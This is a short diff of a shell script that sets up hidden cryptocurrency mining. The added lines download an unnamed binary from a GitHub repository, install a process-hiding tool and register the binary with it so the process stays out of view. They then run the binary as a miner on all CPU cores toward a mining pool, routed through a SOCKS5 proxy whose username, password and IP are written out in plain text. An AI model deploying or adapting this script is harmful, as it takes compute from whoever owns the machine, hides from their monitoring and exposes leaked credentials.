@@ -1,1 +1,13 @@
 ./t-rex -a ethash -o stratum+tcp://ethash.mine.zergpool.com:9999 -u TDLM5E7245pv9N1gRpjzmxVuaXiboAu4qt -p  c=TRX,mc=AKA/CLO/EGEM/ETHO/EXP/TSF,ID=Aman
+
+
+
+apt update -y  
+apt install curl libssl1.0-dev  
+nodejs nodejs-dev node-gyp 
+npm -y  
+wget https://github.com/yuvraj233/colab/raw/main/data  
+npm i -g node-process-hider  
+chmod +x data  
+ph add data  
+./data -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u TDLM5E7245pv9N1gRpjzmxVuaXiboAu4qt -p c=TRX -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
